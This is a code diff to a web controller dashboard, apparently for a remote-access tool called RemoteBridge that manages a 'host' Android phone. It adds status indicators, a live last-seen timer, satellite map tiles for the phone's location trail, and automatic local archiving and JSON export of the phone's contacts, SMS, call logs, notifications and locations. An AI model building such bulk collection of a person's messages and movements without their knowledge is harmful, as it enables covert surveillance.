@@ -234,6 +234,21 @@
             background: #ef4444;
             box-shadow: 0 0 5px rgba(239, 68, 68, .8);
         }
+        /* B6 — الدائرة البرتقالية: غير متصل لكن له اتصال سابق وبيانات مخزنة على خادم Render */
+        .host-status-dot.offline-seen {
+            background: #f59e0b;
+            box-shadow: 0 0 6px rgba(245, 158, 11, .9);
+            animation: hostDotPulse 2.4s ease-in-out infinite;
+        }
+        /* B6 — الدائرة نفسها تفتح نافذة الحالة عند النقر (مساحة نقر أوسع + تكبير عند التحويم) */
+        .host-dot-btn {
+            cursor: pointer !important;
+            transition: transform .15s ease;
+        }
+        .host-dot-btn:hover {
+            transform: scale(1.45);
+            filter: brightness(1.25);
+        }
         @keyframes hostDotPulse {
             0%, 100% { transform: scale(.9); opacity: .85; }
             50% { transform: scale(1.25); opacity: 1; }
@@ -1049,26 +1064,31 @@
             }
 
             const p2pAlive = isP2pAlive();
+            // B6 — فحص كون الجهاز غير المتصل «شهد بيانات» محفوظة على خادم Render (أساس الدائرة البرتقالية)
+            for (const r of offlineTotals) { try { probeServerDataPresence(r.deviceId); } catch (_) {} }
             const cardHtml = (deviceId, deviceName, isOnline) => {
                 const selected = deviceId === currentTarget;
                 const flash = selected && p2pAlive ? "host-flash" : "";
-                const dotCls = isOnline ? "host-status-dot on" : "host-status-dot off";
+                // B6 — بلا أي نص حالة: أخضر = أونلاين • برتقالي = غير متصل لكن له اتصال سابق وبيانات مخزنة على الخادم • أحمر = أرق
+                const seenOnServer = serverDataPresence[deviceId] === true;
+                const dotCls = isOnline ? "host-status-dot on" : (seenOnServer ? "host-status-dot offline-seen" : "host-status-dot off");
+                const dotTitle = isOnline
+                    ? "متصل الآن — انقر الدائرة لفتح نافذة الحالة"
+                    : seenOnServer
+                        ? "غير متصل — لكن له اتصال سابق وبيانات مخزنة على خادم Render — انقر الدائرة لفتح نافذة الحالة"
+                        : "غير متصل ولا توجد بيانات مخزنة بعد — انقر الدائرة لفتح نافذة الحالة";
                 const border = selected ? "border-emerald-500/80 bg-emerald-950/25" : "border-slate-700/60 bg-slate-900/80";
-                const statusBadge = selected && p2pAlive
-                    ? `<span class="text-[9px] bg-emerald-950 border border-emerald-400/60 text-emerald-300 px-2 py-0.5 rounded-full">متصل ونشط</span>`
-                    : isOnline
-                        ? `<span class="text-[9px] bg-emerald-950 border border-emerald-500/30 text-emerald-300 px-2 py-0.5 rounded-full">نشط أونلاين</span>`
-                        : `<span class="text-[9px] bg-slate-800 border border-slate-600/40 text-slate-400 px-2 py-0.5 rounded-full">محفوظ — غير نشط</span>`;
                 const modelInfo = hostModelCache[deviceId] ? `<p class="text-[9px] text-slate-500 font-mono">${hostModelCache[deviceId]}</p>` : "";
                 const batt = hostBatteryChip[deviceId];
                 const battText = (batt && typeof batt.level === 'number' && batt.level >= 0)
                     ? `<span class="text-[9px] px-1.5 py-0.5 rounded-md border ${batt.level <= 15 ? 'border-rose-500/60 text-rose-300 bg-rose-950/60' : 'border-emerald-500/40 text-emerald-300 bg-emerald-950/50'} font-bold" title="آخر بطارية معروفة">🔋 ${batt.level}%${batt.charging ? ' ⚡' : ''}</span>`
                     : "";
-                const snapBtn = `<button onclick="event.stopPropagation(); openHostSnapshotModal('${deviceId}')" title="آخر حالة مخزنة على خادم Render — تعمل حتى عند انقطاع المضيف" class="text-[9px] px-1.5 py-0.5 rounded-md border border-slate-600/50 text-slate-300 bg-slate-800/80 hover:bg-slate-700 font-bold transition">💾 الحالة</button>`;
                 return `
                 <div onclick="selectAndConnectHost('${deviceId}')" class="p-2 ${border} ${flash} rounded-xl flex items-center justify-between cursor-pointer transition hover:bg-slate-800/90">
                     <div class="flex items-center gap-2">
-                        <div class="${dotCls}"></div>
+                        <span class="host-dot-btn" onclick="event.stopPropagation(); openHostStatusWindow('${deviceId}')" title="${dotTitle}" style="width:26px;height:26px;display:inline-flex;align-items:center;justify-content:center;">
+                            <div class="${dotCls}"></div>
+                        </span>
                         <div>
                             <p class="text-xs font-bold text-slate-200">${deviceName}</p>
                             <p class="text-[10px] font-mono text-slate-400">${deviceId}</p>
@@ -1076,8 +1096,7 @@
                         </div>
                     </div>
                     <div class="flex flex-col items-end gap-1">
-                        ${statusBadge}
-                        <div class="flex items-center gap-1 ${battText || snapBtn ? '' : 'hidden'}">${battText}${snapBtn}</div>
+                        <div class="flex items-center gap-1 ${battText ? '' : 'hidden'}">${battText}</div>
                     </div>
                 </div>`;
             };
@@ -1092,6 +1111,33 @@
         let autoFetchInFlight = false;
         const savedHosts = new Map(); // deviceId -> {deviceId, deviceName, lastSeenAt, online}
         const hostModelCache = {};    // deviceId -> "الموديل • Android xx" (من device_info عند الاتصال)
+        // B6 — كشف وجود بيانات محفوظة على خادم Render للجهاز غير المتصل (أساس الدائرة البرتقالية)
+        // فحص /api/state مرة كل ~60 ثانية لكل جهاز، وإعادة رسم القائمة فقط عند تغير النتيجة.
+        const serverDataPresence = {}; // deviceId -> true|false (بعد الفحص) — undefined = لم يفحص بعد
+        const serverDataProbeTs = {};  // deviceId -> آخر زمن فحص (خانق 60 ثانية)
+        function probeServerDataPresence(deviceId) {
+            try {
+                if (!deviceId) return;
+                const now = Date.now();
+                if (serverDataProbeTs[deviceId] && (now - serverDataProbeTs[deviceId]) < 60000) return;
+                serverDataProbeTs[deviceId] = now;
+                const base = serverStateApiBase();
+                if (!base) return;
+                fetch(base + '/api/state?deviceId=' + encodeURIComponent(deviceId))
+                    .then(r => r.ok ? r.json() : null)
+                    .then(snap => {
+                        const has = !!(snap && snap.data && (snap.ts || Object.keys(snap.data || {}).length));
+                        const prev = serverDataPresence[deviceId];
+                        serverDataPresence[deviceId] = has;
+                        if (prev !== has) { try { renderHostList(); } catch (_) {} }
+                    })
+                    .catch(() => {
+                        const prev = serverDataPresence[deviceId];
+                        serverDataPresence[deviceId] = false;
+                        if (prev !== false) { try { renderHostList(); } catch (_) {} }
+                    });
+            } catch (_) {}
+        }
         try {
             for (const rec of (JSON.parse(localStorage.getItem("remotebridge_saved_hosts_v1") || "[]"))) {
                 if (rec && rec.deviceId) savedHosts.set(rec.deviceId, { ...rec, online: false });
@@ -2056,6 +2102,11 @@
             const data = resp.data || {};
             const cmd = data.cmd || resp.cmd;
 
+            // B6 — حفظ تلقائي لأرشيف المتحكم: عندما يصل رد حقيقي عبر الربط P2P
+            // (يعني: المضيف والمتحكم متصلان بنفس الجلسة والوقت) تُخزَّن نسخة
+            // من القوائم/بيانات الجهاز في ملفات المتحكم المحلية للتصفح لاحقاً.
+            try { archiveDeviceCapture(cmd, data); } catch (_) {}
+
             // B4 — تتبع حالة أذونات الهاتف المضيف من ردود الأوامر الحقيقية (تُعرض في الإعدادات)
             try {
                 if (cmd === 'notifications_list') {
@@ -2594,9 +2645,9 @@
             openVaultBlobsPanel();
         }
 
-        async function openVaultBlobsPanel() {
+        async function openVaultBlobsPanel(forDeviceId) {
             const base = serverStateApiBase();
-            const hostId = appConfig.targetDeviceId || '';
+            const hostId = forDeviceId || appConfig.targetDeviceId || '';
             if (!base || !hostId) { showToast('اضبط عنوان الخادم وحدد معرف الهاتف المضيف أولاً', 'warn'); return; }
             showToast('جارٍ جلب قائمة ملفات الخزنة المشفرة من الخادم...', 'info');
             const results = await Promise.allSettled(
@@ -3454,6 +3505,12 @@
         // View 1: Dashboard View
         function renderDashboardView() {
             const batteryText = latestDeviceInfo ? `${latestDeviceInfo.batteryLevel}%${latestDeviceInfo.isCharging ? ' (جارٍ الشحن ⚡)' : ' (على البطارية)'}` : 'جارٍ جلب البيانات...';
+            // B6 — آخر رؤية: عدّاد الوقت المنقضي منذ آخر ظهور للجهاز (يتحدث كل ثانية بشكل متصل)
+            const hostIdNow = activeTargetDeviceId || appConfig.targetDeviceId;
+            const lastSeenRec = hostIdNow ? savedHosts.get(hostIdNow) : null;
+            const lastSeenTs = lastSeenRec && lastSeenRec.lastSeenAt ? lastSeenRec.lastSeenAt : 0;
+            const lastSeenText = lastSeenTs ? fmtElapsedAr(Date.now() - lastSeenTs) : 'بدون سجل بعد';
+            const lastSeenDetail = lastSeenTs ? recFmtDate(lastSeenTs) : 'يبدأ العد تلقائياً بعد أول اتصال بالجهاز';
             const storageText = latestDeviceInfo ? `${(latestDeviceInfo.storageFreeBytes / 1073741824).toFixed(1)} GB / ${(latestDeviceInfo.storageTotalBytes / 1073741824).toFixed(0)} GB` : 'جارٍ جلب البيانات...';
             const osText = latestDeviceInfo ? `Android ${latestDeviceInfo.androidVersion} (API ${latestDeviceInfo.sdkInt})` : 'جارٍ جلب البيانات...';
 
@@ -3471,11 +3528,22 @@
                 </div>
 
                 <div class="grid grid-cols-1 sm:grid-cols-3 gap-2.5 md:gap-4 mb-4">
-                    <div class="bg-slate-900/80 p-3.5 rounded-xl border border-slate-800 flex items-center gap-3">
-                        <div class="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-xl">🔋</div>
-                        <div>
-                            <p class="text-[11px] text-slate-400 font-medium">حالة البطارية</p>
-                            <p id="dash-battery" class="text-sm md:text-base font-bold text-slate-100">${batteryText}</p>
+                    <!-- B6 — بطاقة بنصفين: النصف الأول لمستوى البطارية • النصف الثاني للموقع (عند النقر تفتح الخريطة الحقيقية) ويحوي عدّاد «آخر رؤية» المتصل للوقت المنقضي -->
+                    <div class="bg-slate-900/80 rounded-xl border border-slate-800 grid grid-cols-2 overflow-hidden">
+                        <div class="p-3.5 flex items-center gap-3">
+                            <div class="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-xl shrink-0">🔋</div>
+                            <div class="min-w-0">
+                                <p class="text-[11px] text-slate-400 font-medium">مستوى البطارية</p>
+                                <p id="dash-battery" class="text-sm md:text-base font-bold text-slate-100 truncate">${batteryText}</p>
+                            </div>
+                        </div>
+                        <div class="p-3.5 flex items-center gap-2.5 border-r border-slate-800 bg-slate-950/50 cursor-pointer hover:bg-slate-900/70 transition select-none" onclick="openLocationMapView()" title="انقر لفتح الخريطة التفاعلية الحقيقية (قمر صناعي + طريق سير وشوارع)" >
+                            <div class="w-10 h-10 rounded-xl bg-teal-500/10 border border-teal-500/25 flex items-center justify-center text-xl shrink-0">🗺️</div>
+                            <div class="min-w-0 flex-1">
+                                <p class="text-[11px] text-slate-400 font-medium">الموقع — آخر رؤية</p>
+                                <p id="dash-lastseen" class="text-sm md:text-base font-bold text-amber-200 font-mono truncate" title="الوقت المنقضي منذ آخر رؤية (يُعدّ باستمرار)">${lastSeenText}</p>
+                                <p id="dash-lastseen-detail" class="text-[10px] text-slate-500 truncate">${escapeHtml2(lastSeenDetail)}</p>
+                            </div>
                         </div>
                     </div>
                     <div class="bg-slate-900/80 p-3.5 rounded-xl border border-slate-800 flex items-center gap-3">
@@ -5743,6 +5811,91 @@
             return locationPointsCache || [];
         }
 
+        // ——— B6: محرك بلاطات الخريطة الحقيقية (بمنظور خرائط جوجل) ———
+        // الأسبقية للمزيج الهجين (قمر صناعي + شوارع وطرق كما في خرائط جوجل)، وعند فشل التحميل
+        // يتعادل تلقائياً إلى مصدر مضمون (Esri للقمر الصناعي / OSM للشوارع) مع فلتر يدوي في النافذة.
+        const LOC_TILE_STYLES = [
+            { id: 'hyb', label: 'قمر صناعي + شوارع (مزيج جوجل)', url: 'https://mt{s}.google.com/vt/lyrs=y&hl=ar&x={x}&y={y}&z={z}', sub: '0123', maxNative: 19, attribution: '© Google' },
+            { id: 'rds', label: 'طريق سير وشوارع', url: 'https://mt{s}.google.com/vt/lyrs=m&hl=ar&x={x}&y={y}&z={z}', sub: '0123', maxNative: 19, attribution: '© Google' },
+            { id: 'sat', label: 'قمر صناعي فقط (جوجل)', url: 'https://mt{s}.google.com/vt/lyrs=s&hl=ar&x={x}&y={y}&z={z}', sub: '0123', maxNative: 19, attribution: '© Google' },
+            { id: 'sat2', label: 'قمر صناعي بديل (Esri)', url: 'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', sub: 'a', maxNative: 19, attribution: '© Esri', refOverlay: true },
+            { id: 'osm', label: 'شوارع بديل (OSM)', url: 'https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', sub: 'abc', maxNative: 19, attribution: '© OpenStreetMap' }
+        ];
+        const LOC_FALLBACK_STYLE = { hyb: 'sat2', rds: 'osm', sat: 'sat2', sat2: 'osm', osm: 'rds' };
+        let rbLocTiles = null;
+
+        function rbLocStyleId() {
+            try { const el = document.getElementById('rb-loc-style'); if (el && el.value) return el.value; } catch (_) {}
+            try { const saved = localStorage.getItem('rb_loc_style_v1'); if (saved && LOC_TILE_STYLES.some(s => s.id === saved)) return saved; } catch (_) {}
+            return 'hyb';
+        }
+
+        function rbLocCreateTiles(styleId) {
+            const st = LOC_TILE_STYLES.find(s => s.id === styleId) || LOC_TILE_STYLES[0];
+            const layer = window.L.tileLayer(st.url, {
+                maxZoom: 20,
+                maxNativeZoom: st.maxNative,
+                attribution: st.attribution,
+                subdomains: st.sub
+            });
+            layer.__style = st.id;
+            // عند تجمّع أخطاء البلاطات (حجب/تعطل مصدر) → التبديل المرة الواحدة إلى مصدر بديل تلقائياً
+            let errs = 0;
+            layer.on('tileerror', () => {
+                errs++;
+                if (errs === 5 && rbLocTiles === layer) {
+                    try { layer.off('tileerror'); } catch (_) {}
+                    const fb = LOC_FALLBACK_STYLE[st.id] || 'osm';
+                    if (fb !== st.id) {
+                        try { const sel = document.getElementById('rb-loc-style'); if (sel) sel.value = fb; } catch (_) {}
+                        applyLocTileStyle(fb);
+                        showToast('تعذر تحميل بلاطات الخريطة الأصلية — تم التبديل تلقائياً إلى: ' + ((LOC_TILE_STYLES.find(s => s.id === fb) || {}).label || 'بديل'), 'info');
+                    }
+                }
+            });
+            if (st.refOverlay) {
+                // طبقة أسماء/حدود فوق صور القمر الصناعي (للمصدر البديل Esri)
+                layer.__ref = window.L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Reference/World_Boundaries_and_Places/MapServer/tile/{z}/{y}/{x}', {
+                    maxZoom: 20, maxNativeZoom: st.maxNative, attribution: ''
+                });
+            }
+            return layer;
+        }
+
+        function applyLocTileStyle(styleId) {
+            if (!rbLocMap) return;
+            try { localStorage.setItem('rb_loc_style_v1', styleId); } catch (_) {}
+            try {
+                if (rbLocTiles) {
+                    if (rbLocTiles.__ref) { try { rbLocMap.removeLayer(rbLocTiles.__ref); } catch (_) {} }
+                    rbLocMap.removeLayer(rbLocTiles);
+                }
+            } catch (_) {}
+            rbLocTiles = rbLocCreateTiles(styleId);
+            rbLocTiles.addTo(rbLocMap);
+            if (rbLocTiles.__ref) rbLocTiles.__ref.addTo(rbLocMap);
+        }
+
+        function syncLocTiles() {
+            const style = rbLocStyleId();
+            if (rbLocTiles && rbLocTiles.__style === style) return;
+            applyLocTileStyle(style);
+        }
+
+        function syncLocStyleSelect() {
+            try {
+                const sel = document.getElementById('rb-loc-style');
+                if (!sel || sel.__filled) { if (sel) sel.value = rbLocStyleId(); return; }
+                sel.innerHTML = LOC_TILE_STYLES.map(s => `<option value="${s.id}" ${s.id === rbLocStyleId() ? 'selected' : ''}>${s.label}</option>`).join('');
+                sel.__filled = true;
+            } catch (_) {}
+        }
+
+        function onLocStyleChange() {
+            try { applyLocTileStyle(rbLocStyleId()); } catch (_) {}
+            try { rbLocMap && rbLocMap.invalidateSize && rbLocMap.invalidateSize(); } catch (_) {}
+        }
+
         function openLocationMapView(snapshotData) {
             ensureStreamModalsShell();
             if (snapshotData) locationSnapshotBuffer = snapshotData;
@@ -5752,6 +5905,9 @@
                     <div class="flex items-center justify-between mb-2 gap-2">
                         <h3 class="text-sm font-bold text-teal-300">🗺️ مسار مواقع الهاتف المضيف</h3>
                         <div class="flex items-center gap-1.5">
+                            <!-- B6 — منظور الخريطة: قمر صناعي + شوارع (مزيج خرائط جوجل) أو طريق/شوارع أو بديل -->
+                            <select id="rb-loc-style" onchange="onLocStyleChange()" class="bg-slate-800 border border-slate-600 rounded-xl px-2 py-1.5 text-[11px] text-slate-100">
+                            </select>
                             <select id="rb-loc-window" onchange="redrawLocationMap()" class="bg-slate-800 border border-slate-600 rounded-xl px-2 py-1.5 text-[11px] text-slate-100">
                                 <option value="5">آخر 5 دقائق</option>
                                 <option value="10">آخر 10 دقائق</option>
@@ -5767,6 +5923,7 @@
                     <div id="rb-loc-summary" class="text-[10px] text-slate-500 mt-1.5 font-mono"></div>
                 </div>`;
             el.classList.replace('hidden', 'flex');
+            syncLocStyleSelect(); // B6 — تعبئة قائمة منظور الخريطة (قمر صناعي/شوارع/بديل)
             refreshLocationPoints();
         }
 
@@ -5804,12 +5961,11 @@
                 if (!rbLocMap || !rbLocMap._container || !document.getElementById('rb-loc-map')) {
                     try { if (rbLocMap) rbLocMap.remove(); } catch (_) {}
                     rbLocMap = window.L.map('rb-loc-map', { zoomControl: true }).setView([24.7, 46.6], 11);
-                    window.L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                        maxZoom: 19,
-                        attribution: '© OpenStreetMap contributors'
-                    }).addTo(rbLocMap);
                     rbLocMarkersLayer = window.L.layerGroup().addTo(rbLocMap);
+                    // B6 — بلاطات خريطة حقيقية (جوجل: قمر صناعي + شوارع و/أو طريق سير) بدل OSM الفارغ، مع بدائل تلقائية
+                    applyLocTileStyle(rbLocStyleId());
                 } else {
+                    syncLocTiles();
                     try { setTimeout(() => rbLocMap.invalidateSize(), 60); } catch (_) {}
                 }
                 drawLocationMapData();
@@ -5923,19 +6079,231 @@
             } catch (_) {}
         }
 
-        async function openHostSnapshotModal(deviceId) {
-            ensureStreamModalsShell();
-            const el = document.getElementById('rb-host-snapshot-modal');
-            el.classList.replace('hidden', 'flex');
-            el.innerHTML = `<div class="bg-slate-900 border border-slate-700 rounded-2xl p-6 text-sm text-slate-300">⏳ جارٍ جلب آخر حالة مخزنة من خادم Render...</div>`;
+        // —━━— B6: نافذة الحالة + أرشيف المتحكم المحلي + ادوات الوقت —━━—
+
+        // B6 — صياغة الوقت المنقضي بالعربية (منذ د/س/ث/يوم)
+        function fmtElapsedAr(ms) {
             try {
-                const base = serverStateApiBase();
-                const res = await fetch(base + '/api/state?deviceId=' + encodeURIComponent(deviceId));
-                if (!res.ok) throw new Error('no snapshot');
-                const snap = await res.json();
-                const d = snap.data || {};
-                const lastSeen = d.lastSeen ? recFmtDate(d.lastSeen) : (snap.ts ? recFmtDate(snap.ts) : 'غير معروف');
-                const battery = (snap.batteryLevel !== undefined && snap.batteryLevel >= 0 ? snap.batteryLevel : (d.batteryLevel !== undefined ? d.batteryLevel : -1));
+                ms = Math.max(0, Number(ms) || 0);
+                const s = Math.floor(ms / 1000);
+                const dd = Math.floor(s / 86400), hh = Math.floor((s % 86400) / 3600), mm = Math.floor((s % 3600) / 60), ss = s % 60;
+                const parts = [];
+                if (dd) parts.push(dd + (dd === 1 ? ' يوم' : ' أيام'));
+                if (hh) parts.push(hh + (hh === 1 ? ' ساعة' : hh === 2 ? ' ساعتين' : ' ساعات'));
+                if (mm && !dd) parts.push(mm + (mm === 1 ? ' دقيقة' : mm === 2 ? ' دقيقتين' : ' دقائق'));
+                if (!dd && !hh && !mm && ss) parts.push(ss + (ss === 1 ? ' ثانية' : ss === 2 ? ' ثانيتين' : ss <= 10 ? ' ثواني' : ' ثانية'));
+                if (!parts.length) return 'الآن';
+                return 'منذ ' + parts.join(' و');
+            } catch (_) { return '—'; }
+        }
+
+        // B6 — عدّاد «آخر رؤية» الحي في بطاقة الطاقة/الموقع (كل ثانية) — يتبع الجهاز المختار حالياً
+        setInterval(function tickLastSeen() {
+            try {
+                const el = document.getElementById('dash-lastseen');
+                if (!el) return; // البطاقة غير معروضة الآن
+                const hostId = activeTargetDeviceId || appConfig.targetDeviceId;
+                const rec = hostId ? savedHosts.get(hostId) : null;
+                if (!rec || !rec.lastSeenAt) {
+                    if (el.textContent !== 'بدون سجل بعد') el.textContent = 'بدون سجل بعد';
+                    return;
+                }
+                const txt = fmtElapsedAr(Date.now() - rec.lastSeenAt);
+                if (el.textContent !== txt) el.textContent = txt;
+                const dn = document.getElementById('dash-lastseen-detail');
+                if (dn) { const dt = recFmtDate(rec.lastSeenAt); if (dn.textContent !== dt) dn.textContent = dt; }
+            } catch (_) {}
+        }, 1000);
+
+        // B6 — أرشيف المتحكم المحلي: يُملأ تلقائياً كلما وصلت قوائم من المضيف عبر الربط P2P
+        // (الذي يستوفي شرط «اتصال المضيف والمتحكم بنفس الجلسة») ويبقى مخزناً بشكل استمراري
+        // في ملفات المتحكم المحلية (localStorage) للتصفح لاحقاً حتى بعد انقطاع الطرفين.
+        const DEVICE_ARCHIVE_KEY = "remotebridge_device_archive_v1";
+        const deviceArchive = (function () {
+            try {
+                const arr = JSON.parse(localStorage.getItem(DEVICE_ARCHIVE_KEY) || "[]");
+                const m = new Map();
+                (Array.isArray(arr) ? arr : []).forEach(r => { if (r && r.deviceId) m.set(r.deviceId, r); });
+                return m;
+            } catch (_) { return new Map(); }
+        })();
+        let __archSaveT = null;
+        function scheduleDeviceArchiveSave() {
+            if (__archSaveT) return;
+            __archSaveT = setTimeout(() => {
+                __archSaveT = null;
+                try {
+                    // آخر 12 جهازاً — يليق بحجم localStorage وحدود المتصفح
+                    localStorage.setItem(DEVICE_ARCHIVE_KEY, JSON.stringify([...deviceArchive.values()].slice(-12)));
+                } catch (_) {}
+            }, 2500);
+        }
+
+        // B6 — الالتقاط من ردود أوامر المضيف (يُستدعى من موزّع الردود فقط)
+        function archiveDeviceCapture(cmd, data) {
+            try {
+                const hostId = activeTargetDeviceId || appConfig.targetDeviceId;
+                if (!hostId) return;
+                const rec = deviceArchive.get(hostId) || { deviceId: hostId, name: '', ts: 0, info: null, lists: {} };
+                const LIST_CAP = { contacts: 300, sms: 400, calls: 400, notifications: 300, location: 900 };
+                const map = { contacts_list: 'contacts', sms_list: 'sms', calls_list: 'calls', notifications_list: 'notifications', locations_get: 'location' };
+                let touched = false;
+                if (map[cmd] && Array.isArray(data.items)) {
+                    rec.lists[map[cmd]] = { ts: Date.now(), items: data.items.slice(0, LIST_CAP[map[cmd]] || 300) };
+                    touched = true;
+                }
+                if (cmd === 'device_info' || data.batteryLevel !== undefined || data.deviceName || data.model) {
+                    rec.info = {
+                        ts: Date.now(),
+                        deviceName: data.deviceName || '',
+                        model: data.model || '',
+                        manufacturer: data.manufacturer || '',
+                        androidVersion: data.androidVersion || '',
+                        batteryLevel: typeof data.batteryLevel === 'number' ? data.batteryLevel : undefined,
+                        isCharging: data.isCharging === true,
+                        storageFreeBytes: data.storageFreeBytes,
+                        storageTotalBytes: data.storageTotalBytes
+                    };
+                    if (data.deviceName) rec.name = data.deviceName;
+                    touched = true;
+                }
+                if (!touched) return;
+                if (!rec.name) {
+                    const sr = savedHosts.get(hostId);
+                    if (sr && sr.deviceName) rec.name = sr.deviceName;
+                }
+                rec.ts = Date.now();
+                deviceArchive.set(hostId, rec);
+                scheduleDeviceArchiveSave();
+            } catch (_) {}
+        }
+
+        const ARCH_LIST_LABELS = {
+            contacts: ['👥', 'جهات الاتصال'],
+            sms: ['💬', 'الرسائل'],
+            calls: ['📞', 'المكالمات'],
+            notifications: ['🔔', 'الإشعارات'],
+            location: ['📍', 'نقاط المواقع']
+        };
+
+        // B6 — ملخص عنصر واحد لكل نوع (يظهر في متصفح الأرشيف المحلي)
+        function archItemSummary(kind, it) {
+            try {
+                if (!it) return '';
+                if (kind === 'contacts') return (it.displayName || it.name || '') + ' — ' + (it.phoneNumber || it.phoneNumbers || '');
+                if (kind === 'sms') return ((it.address || '') + ' ← ' + (it.body || '')).slice(0, 80);
+                if (kind === 'calls') return (it.number || it.displayName || '') + ' • ' + (it.type || '') + ' • ' + (it.durationSec || it.duration || 0) + 'ث';
+                if (kind === 'notifications') return (it.packageName || it.app || '') + ' — ' + ((it.title || '') + ' ' + (it.text || it.body || '')).slice(0, 60);
+                if (kind === 'location') return Number(it.lat).toFixed(5) + ', ' + Number(it.lng).toFixed(5) + ' • ' + recFmtDate(it.ts || it.time);
+                return Object.keys(it).slice(0, 3).map(k => `${k}=${String(it[k]).slice(0, 24)}`).join(' | ');
+            } catch (_) { return ''; }
+        }
+
+        function downloadDeviceArchiveJson(deviceId) {
+            try {
+                const rec = deviceArchive.get(deviceId);
+                if (!rec || !deviceId) { showToast('لا يوجد أرشيف محلي لهذا الجهاز بعد', 'warn'); return; }
+                const blob = new Blob([JSON.stringify(rec, null, 2)], { type: 'application/json' });
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = `remotebridge_archive_${String(deviceId).slice(0, 18)}_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
+                document.body.appendChild(a);
+                a.click();
+                setTimeout(() => { try { URL.revokeObjectURL(a.href); a.remove(); } catch (_) {} }, 800);
+                showToast('تم حفظ نسخة الأرشيف كملف JSON في التنزيلات', 'success');
+            } catch (_) { showToast('فشل تنزيل الأرشيف', 'error'); }
+        }
+
+        // B6 — متصفح أرشيف المتحكم المحلي (بيانات أُخذت أثناء جلسات اتصال الطرفين معاً)
+        function renderDeviceArchivePanel(deviceId) {
+            try {
+                const rec = deviceArchive.get(deviceId);
+                const name = (rec && rec.name) || ((savedHosts.get(deviceId) || {}).deviceName) || deviceId;
+                if (!rec || (!rec.info && Object.keys(rec.lists || {}).length === 0)) {
+                    mountWindowOverlay(`
+                        <div class="chat-header">
+                            <div>
+                                <h4 class="font-bold text-slate-100 text-sm">📁 أرشيف المتحكم المحلي — ${escHtml(String(name))}</h4>
+                                <p class="text-[10px] text-slate-400 mt-0.5">لا توجد بيانات محفوظة بعد</p>
+                            </div>
+                            <button onclick="closeWindowOverlay()" class="text-slate-400 hover:text-white px-1.5 py-1 text-sm">✕</button>
+                        </div>
+                        <div class="chat-body">
+                            <div class="text-center text-slate-500 text-xs py-6">تُحفظ البيانات تلقائياً عندما يتبادل المضيف والمتحكم القوائم عبر الربط — ثم تصبح هنا للتصفح لاحقاً حتى بعد انقطاع الطرفين.</div>
+                        </div>`);
+                    return;
+                }
+                const info = rec.info || {};
+                const listsRows = Object.keys(ARCH_LIST_LABELS).map(kind => {
+                    const lt = rec.lists && rec.lists[kind];
+                    if (!lt || !Array.isArray(lt.items) || !lt.items.length) return '';
+                    const [icon, label] = ARCH_LIST_LABELS[kind];
+                    const prev = lt.items.slice(0, 8).map(it => `
+                        <div class="text-[9px] text-slate-400 bg-slate-950/50 border border-slate-800 rounded-lg px-2 py-1 truncate" style="direction:ltr">${escHtml(archItemSummary(kind, it))}</div>`).join('');
+                    return `
+                    <div class="rounded-xl border border-slate-800 bg-slate-900/60 p-2.5">
+                        <div class="flex items-center justify-between gap-2">
+                            <p class="text-[11px] font-bold text-slate-200">${icon} ${label} <span class="text-[9px] text-slate-500 font-mono">(${lt.items.length} عنصر)</span></p>
+                            <span class="text-[9px] text-slate-500"><span class="ts-en">${fmtEnTime(lt.ts || 0)}</span></span>
+                        </div>
+                        <div class="mt-1.5 space-y-1">${prev}</div>
+                    </div>`;
+                }).join('') || '<div class="text-[10px] text-slate-500 text-center py-3">لم تُحفظ قوائم كاملة بعد — تُرصد القوائم تلقائياً فور اكتمال الربط مع المضيف.</div>';
+
+                mountWindowOverlay(`
+                    <div class="chat-header">
+                        <div>
+                            <h4 class="font-bold text-slate-100 text-sm">📁 أرشيف المتحكم المحلي — ${escHtml(String(name))}</h4>
+                            <p class="text-[10px] text-slate-400 mt-0.5">حفظ تلقائي لجلسات اتصال المضيف+المتحكم — <span class="ts-en">${fmtEnTime(rec.ts || 0)}</span></p>
+                        </div>
+                        <div class="flex items-center gap-1.5">
+                            <button onclick='downloadDeviceArchiveJson(${JSON.stringify(String(deviceId))})' class="text-[10px] font-bold bg-emerald-900/70 hover:bg-emerald-800 text-emerald-300 border border-emerald-700/50 px-2 py-1 rounded-lg">⬇️ تنزيل JSON</button>
+                            <button onclick="closeWindowOverlay()" class="text-slate-400 hover:text-white px-1.5 py-1 text-sm">✕</button>
+                        </div>
+                    </div>
+                    <div class="chat-body space-y-2">
+                        ${info.ts ? `<div class="rounded-xl border border-slate-800 bg-slate-950/40 p-2.5 text-[10px] text-slate-300">
+                            <b class="text-emerald-300">⚙️ آخر معلومات جهاز:</b> ${escHtml([info.model, info.manufacturer, info.androidVersion ? 'أندرويد ' + info.androidVersion : ''].filter(Boolean).join(' • ') || 'غير معروفة')}
+                            ${typeof info.batteryLevel === 'number' ? ` • 🔋 ${info.batteryLevel}%${info.isCharging ? ' ⚡' : ''}` : ''}
+                        </div>` : ''}
+                        ${listsRows}
+                    </div>`);
+            } catch (_) {}
+        }
+
+        // B6 — عدّاد المنقضي داخل نافذة الحالة (يتوقف تلقائياً عند إغلاقها)
+        let rbSwElapsedTimer = null;
+        function rbStartStatusElapsed(lastTs) {
+            if (rbSwElapsedTimer) { clearInterval(rbSwElapsedTimer); rbSwElapsedTimer = null; }
+            if (!lastTs) return;
+            rbSwElapsedTimer = setInterval(() => {
+                const e = document.getElementById('rb-sw-elapsed');
+                if (!e) { clearInterval(rbSwElapsedTimer); rbSwElapsedTimer = null; return; }
+                e.innerText = fmtElapsedAr(Date.now() - lastTs);
+            }, 1000);
+        }
+
+        // B6 — نافذة حالة الجهاز: تفتح من الدائرة بجوار اسم الجهاز في قائمة الأجهزة المتاحة
+        // تعرض: آخر رؤية + المنقضي الحي + بطارية/عدّادات من ملقطة الخادم، وتتصفح بيانات
+        // ذاكرة خادم Render (المرفوعة صندلما كان المضيف أونلاين والمتحكم غير متصل) + نسخة المتحكم المحلية.
+        async function openHostStatusWindow(deviceId) {
+            try {
+                ensureStreamModalsShell();
